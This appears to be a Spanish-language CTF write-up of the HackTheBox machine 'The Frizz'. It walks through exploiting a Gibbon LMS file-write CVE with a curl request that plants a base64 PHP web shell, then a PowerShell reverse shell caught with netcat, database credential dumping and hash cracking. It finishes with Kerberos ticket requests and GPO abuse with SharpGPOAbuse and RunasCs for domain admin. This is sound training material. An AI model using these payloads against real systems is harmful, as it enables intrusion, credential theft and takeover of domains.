---
title: The Frizz - HackTheBox Season 7
date: 2025-03-22 20:30:00 +0000
layout: post
permalink: /writeups/HTB/LABS/the-frizz-htb-season7
categories: [HacktheBox, Labs]
image:
  path: /assets/img/writeups/hackthebox/theFrizz-htb-s7/cabecera.png
  alt: HackTheBox
description: >
  Guía en español para The Frizz - HackTheBox Season 7
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
❯ nmap -sC -sV --min-rate 5000 -O  10.10.11.60
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-17 12:43 CET
Nmap scan report for 10.10.11.60
Host is up (0.098s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-17 18:43:59Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

En este caso no se nos proporcionan credenciales de ningún tipo por lo que lo más seguro es que nuestra entrada se encuentre en la aplicación web.

## Explorando puerto 80

Si accedemos a su aplicación web podemos ver que se trata de un portal web de lo que parece una escuela o centro de formación y donde tenemos un acceso ya sea alumnos o profesores.

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image.png)

Poco más abajo bemos el LMS que utilza esta web. 

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-1.png)

Buscando CVE podemos encontrar varios entre el que encontramos un LFI que nos permite acceder a archivos de configuración de la aplicación.

[CVE en Github](https://github.com/maddsec/CVE-2023-34598)

En este caso el parámetro vulnerable lo encontramos en

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-2.png)

Junto con este LFI encontramos otro CVE que nos permite subir archivos.

[CVE-2023-45878](https://github.com/advisories/GHSA-r526-pvv3-w6p8)

**GibbonEdu** (versión 25.0.1 y anteriores) permite **escritura de archivos arbitrarios** debido a que el archivo **rubrics_visualise_saveAjax.php** no requiere autenticación. El endpoint acepta los parámetros `img`, `path` y `gibbonPersonID`. El parámetro `img` se espera que sea una imagen codificada en base64. Si se establece el parámetro `path`, la ruta definida se utiliza como carpeta de destino, concatenada con la ruta absoluta del directorio de instalación. El contenido del parámetro `img` se decodifica en base64 y se escribe en la ruta de archivo definida. Esto permite la creación de archivos PHP que permiten la **ejecución remota de código** (sin autenticación).

`/modules/Rubrics/rubrics_visualise_saveAjax.php`

## Subiendo una shell en php

Ahora que tenemos claro que es posible una subida de archivos solo nos queda subir una shell simple en php.

El payload en cuestión es el siguiente:

```bash
❯ curl -X POST "http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php" \
-H "Host: frizzdc.frizz.htb" \
--data-urlencode "img=image/png;asdf,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4K" \
--data-urlencode "path=shell.php" \
--data-urlencode "gibbonPersonID=0000000001"
```

Una vez ejecutado podemos hacer una petición en `http://frizzdc.frizz.htb/Gibbon-LMS/shell.php?cmd=<poweshell base64 reverse shell>`

Esta shell podemos crearla en [Revshells](https://www.revshells.com/)

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-3.png)

Creada la shell ponemos nuestro puerto de escucha y la ejecutamos pasandola por el parámetro `cmd` en la url.
 ### Reverse Shell

```bash	
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.52] from (UNKNOWN) [10.10.11.60] 51414
```

Una vez estamos dentro podemos investigar el sistema. No tenemos acceso a ningún directorio de usuario o no parecen existir aunque lo más seguro es que estén ocultos para nuestro usuario.

Mirando el config.php encontramos las crendecias de la base de datos.

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-5.png)

Ahora dentro del sistema para poder acceder a mysql necesitamos hacer lo siguiente:

```cmd
PS C:\xampp\mysql\bin> .\mysql.exe -h localhost -u MrGibbonsDB -pMisterGibbs!Parrot!?1 -e "SHOW DATABASES;"
Database
gibbon
information_schema
test
```
```cmd
.\mysql.exe -h localhost -u MrGibbonsDB -pMisterGibbs!Parrot!?1 -e "USE gibbon; SHOW TABLES;"
Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
gibbonactivityslot
gibbonactivitystaff
gibbonactivitystudent
gibbonactivitytype
gibbonadmissionsaccount
gibbonadmissionsapplication
gibbonalarm
gibbonalarmconfirm
gibbonalertlevel
gibbonapplicationform
gibbonapplicationformfile
gibbonapplicationformlink
gibbonapplicationformrelationship
gibbonattendancecode
gibbonattendancelogcourseclass
gibbonattendancelogformgroup
gibbonattendancelogperson
gibbonbehaviour
gibbonbehaviourletter
gibboncountry
gibboncourse
gibboncourseclass
gibboncourseclassmap
gibboncourseclassperson
gibboncrowdassessdiscuss
gibboncustomfield
gibbondataretention
gibbondaysofweek
gibbondepartment
gibbondepartmentresource
gibbondepartmentstaff
gibbondiscussion
gibbondistrict
gibbonemailtemplate
gibbonexternalassessment
gibbonexternalassessmentfield
gibbonexternalassessmentstudent
gibbonexternalassessmentstudententry
gibbonfamily
gibbonfamilyadult
gibbonfamilychild
gibbonfamilyrelationship
gibbonfamilyupdate
gibbonfileextension
gibbonfinancebillingschedule
gibbonfinancebudget
gibbonfinancebudgetcycle
gibbonfinancebudgetcycleallocation
gibbonfinancebudgetperson
gibbonfinanceexpense
gibbonfinanceexpenseapprover
gibbonfinanceexpenselog
gibbonfinancefee
gibbonfinancefeecategory
gibbonfinanceinvoice
gibbonfinanceinvoicee
gibbonfinanceinvoiceeupdate
gibbonfinanceinvoicefee
gibbonfirstaid
gibbonfirstaidfollowup
gibbonform
gibbonformfield
gibbonformgroup
gibbonformpage
gibbonformsubmission
gibbonformupload
gibbongroup
gibbongroupperson
gibbonhook
gibbonhouse
gibboni18n
gibbonin
gibboninarchive
gibboninassistant
gibbonindescriptor
gibbonininvestigation
gibbonininvestigationcontribution
gibboninpersondescriptor
gibboninternalassessmentcolumn
gibboninternalassessmententry
gibbonlanguage
gibbonlibraryitem
gibbonlibraryitemevent
gibbonlibrarytype
gibbonlog
gibbonmarkbookcolumn
gibbonmarkbookentry
gibbonmarkbooktarget
gibbonmarkbookweight
gibbonmedicalcondition
gibbonmessenger
gibbonmessengercannedresponse
gibbonmessengerreceipt
gibbonmessengertarget
gibbonmigration
gibbonmodule
gibbonnotification
gibbonnotificationevent
gibbonnotificationlistener
gibbonoutcome
gibbonpayment
gibbonpermission
gibbonperson
gibbonpersonaldocument
gibbonpersonaldocumenttype
gibbonpersonmedical
gibbonpersonmedicalcondition
gibbonpersonmedicalconditionupdate
gibbonpersonmedicalupdate
gibbonpersonreset
gibbonpersonstatuslog
gibbonpersonupdate
gibbonplannerentry
gibbonplannerentrydiscuss
gibbonplannerentryguest
gibbonplannerentryhomework
gibbonplannerentryoutcome
gibbonplannerentrystudenthomework
gibbonplannerentrystudenttracker
gibbonplannerparentweeklyemailsummary
gibbonreport
gibbonreportarchive
gibbonreportarchiveentry
gibbonreportingaccess
gibbonreportingcriteria
gibbonreportingcriteriatype
gibbonreportingcycle
gibbonreportingprogress
gibbonreportingproof
gibbonreportingscope
gibbonreportingvalue
gibbonreportprototypesection
gibbonreporttemplate
gibbonreporttemplatefont
gibbonreporttemplatesection
gibbonresource
gibbonresourcetag
gibbonrole
gibbonrubric
gibbonrubriccell
gibbonrubriccolumn
gibbonrubricentry
gibbonrubricrow
gibbonscale
gibbonscalegrade
gibbonschoolyear
gibbonschoolyearspecialday
gibbonschoolyearterm
gibbonsession
gibbonsetting
gibbonspace
gibbonspaceperson
gibbonstaff
gibbonstaffabsence
gibbonstaffabsencedate
gibbonstaffabsencetype
gibbonstaffapplicationform
gibbonstaffapplicationformfile
gibbonstaffcontract
gibbonstaffcoverage
gibbonstaffcoveragedate
gibbonstaffduty
gibbonstaffdutyperson
gibbonstaffjobopening
gibbonstaffupdate
gibbonstring
gibbonstudentenrolment
gibbonstudentnote
gibbonstudentnotecategory
gibbonsubstitute
gibbontheme
gibbontt
gibbonttcolumn
gibbonttcolumnrow
gibbonttday
gibbonttdaydate
gibbonttdayrowclass
gibbonttdayrowclassexception
gibbonttimport
gibbonttspacebooking
gibbonttspacechange
gibbonunit
gibbonunitblock
gibbonunitclass
gibbonunitclassblock
gibbonunitoutcome
gibbonusernameformat
gibbonyeargroup
```
```cmd
.\mysql.exe -h localhost -u MrXXXXsDB -pXXXXXXXXXXXXXX!?1 -e "USE gibbon; SELECT * FROM gibbonperson;"
```
![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-4.png)

En esta utlima parece que tenemos unas credenciales junto con su salt. El tipo de hash es bcrypt, sha256+salt o algo parecido por lo que investigando un poco los hashes podemos formar el hash para hashcat.

```plaintext
067f746faXXXXXXXXXXXXXXXXXXXXXXXXXXXX784242b0b0c03:/aACFXXXXXXXXXXX2489
```

### Crackeando el hash

Ahora podemos cracker el hash con hashcat.

```bash
❯ hashcat -m 1420 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-6.png)

## TGT para ssh

Probando estas credenciales en los servicios del DC encontramos que el protocolo ssh no es accesible mediante credenciales por lo que necesitamos pedir un TGT para ssh.

Usando impacket:

```bash
impacket-getTGT frizz.htb/f.frizzle:<cracked-password> -dc-ip 10.10.11.60
```

Probablemente no estemos sincronizados con el servidor por lo que tendremos el siguiente error:

```bash
❯ impacket-getTGT frizz.htb/f.frizzle:XXXXXXXXXXX -dc-ip 10.10.11.60
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Tenemos que sincronizar el tiempo con el servidor.

```bash
❯ sudo ntpdate -s 10.10.11.60

❯ impacket-getTGT frizz.htb/f.frizzle:XXXXXXXXXXX -dc-ip 10.10.11.60
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in f.frizzle.ccache
```

Para poder usarlo establecemos la variable de entorno `KRB5CCNAME` con el path del ccache que acabamos de crear.

```bash
export KRB5CCNAME=/home/kali/Downloads/frizz-htb/f.frizzle.ccache
```

Configuramos también nuestro archivo krb5.conf.

```bash
sudo nano /etc/krb5.conf 

[libdefaults]
    default_realm = FRIZZ.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    FRIZZ.HTB = {
        kdc = 10.10.11.60
        admin_server = 10.10.11.60
    }

[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB
```

Ahora conectamos por ssh.

```bash
ssh f.frizzle@frizz.htb
```

### User flag

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-7.png)

## Escalado de privilegios

Ahora que somos un usuario podemos intentar buscar otros dentro del sistema que puedan tener privilegios elevados.

Primero podemos listar los usuarios del dominio.

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-8.png)

Vamos a recopilar un poco de información sobre el usuario que manejamos.

```powershell
PS C:\Users\f.frizzle> whoami /all 

USER INFORMATION
----------------

User Name       SID
=============== ==============================================
frizz\f.frizzle S-1-5-21-2386970044-1145388522-2932701813-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

En principio nos va a interesar los usuarios que pueden pertencer al grupo `BUILTIN\Remote Management Users`

```powershell
PS C:\Users\f.frizzle> Get-ADGroupMember "Domain Admins"

distinguishedName : CN=Administrator,CN=Users,DC=frizz,DC=htb
name              : Administrator
objectClass       : user
objectGUID        : 50b5f20a-540e-4400-8b9a-38c2a13a58f0
SamAccountName    : Administrator
SID               : S-1-5-21-2386970044-1145388522-2932701813-500

distinguishedName : CN=v.frizzle,OU=Class_Frizz,DC=frizz,DC=htb
name              : v.frizzle
objectClass       : user
objectGUID        : 1f66daa2-7d19-4b9f-b3d8-7258f78d522a
SamAccountName    : v.frizzle
SID               : S-1-5-21-2386970044-1145388522-2932701813-1115

PS C:\Users\f.frizzle> Get-ADGroupMember "Remote Management Users"

distinguishedName : CN=M.SchoolBus,OU=Class_Frizz,DC=frizz,DC=htb
name              : M.SchoolBus
objectClass       : user
objectGUID        : b1dbb2ff-284f-4706-bdfe-0778f72647f7
SamAccountName    : M.SchoolBus
SID               : S-1-5-21-2386970044-1145388522-2932701813-1106

distinguishedName : CN=f.frizzle,OU=Class_Frizz,DC=frizz,DC=htb
name              : f.frizzle
objectClass       : user
objectGUID        : faf0e23c-2a99-499d-b816-07636d645c37
SamAccountName    : f.frizzle
SID               : S-1-5-21-2386970044-1145388522-2932701813-1103
```

Estos son los usuarios potenciales que podemos usar para escalar nuestro privilegios.

La idea es observar que permisos tenemos como `f.frizzle` por si podemos pivotar a `v.frizzle`. Si no es posible podemos intentar buscar acceso al usuario `M.SchoolBus` y ver sus permisos.

Como `f.frizzle` no tenemos privilegios por lo que directamente vamos a buscar por el sistema datos sobre el otro usuario `M.SchoolBus`.

Buscando por el sistema podemos encontrar algunos archivos interesantes aunque son algo complejos de encontrar. 

> Nota : Siendo un laboratorio podemos tomar algunas pruebas sobre lo que están haciendo los demás usuarios viendo el historial de comandos de los demás.
{: .prompt-info}

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-13.png)

Al parecer en la papelera podemos encontrar un archivo 7z.

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-14.png)

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-15.png)

Al parecer solo el archivo RE2XMEG.7z tiene contenido.

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-16.png)

Lo unico que encontramos interesante parecen ser estos archivos de configuración en los que parece haber unas credenciales en base 64.

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-17.png)

## Conexión a M.SchoolBus

Una vez tenemos las credenciales de M.SchoolBus podemos conectarnos por ssh y ver sus permisos.

Primero al igual que antes necesitamos el TGT para ssh.

```bash
impacket-getTGT frizz.htb/M.SchoolBus:<cracked-password> -dc-ip 10.10.11.60
```

Ahora conectamos por ssh.

```bash
export KRB5CCNAME=/home/kali/Downloads/frizz-htb/M.SchoolBus.ccache
ssh M.SchoolBus@frizz.htb
```

```powershell
PS C:\Users\M.SchoolBus> whoami /all 

USER INFORMATION
----------------

User Name         SID
================= ==============================================
frizz\m.schoolbus S-1-5-21-2386970044-1145388522-2932701813-1106


GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes
============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
frizz\Desktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

De aquí vemos que al formar parte del grupo `frizz\Grupo Policy Creator Owners` podemos ver que tenemos permisos para crear GPOs.

Aprovechando esto pues, nos podemos asignar una nueva GPO como administradors de la máquina y de esta manera tener acceso a todos los archivos dentro de la máquina.

```powershell
New-GPO -Name "Root"
```

Creamos la nueva GPO y la añadimos a nivel de dominio.

```powershell
New-GPLink -Name "Root" -Target "OU=Domain Controllers,DC=frizz,DC=htb"
```

Ahora mediante una herramienta podemos abusar de esta GPO. La herramienta en cuestion es [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse).

```powershell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName Root
```

Forzamos la actualización de la GPO.

```powershell
gpupdate /force
```

Ahora usaremos otra herramienta que es una especie de `sudo` "vitaminado" para windows. Esto nos permite devolvernos una shell como `M.SchoolBus` pero con privilegios elevados.

[RunasCs](https://github.com/antonioCoco/RunasCs)

> Nota : Ambas herramientas las podemos descargar en nuestra maquina y pasarlas por http.
{: .prompt-info}

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-9.png)

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-10.png)

```powershell
.\RunasC.exe "M.SchoolBus" '!suBcig@MehTed!R' powershell.exe -r 10.10.14.7:9001
```

### Root flag

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-11.png)

![alt text](/assets/img/writeups/hackthebox/theFrizz-htb-s7/image-12.png)
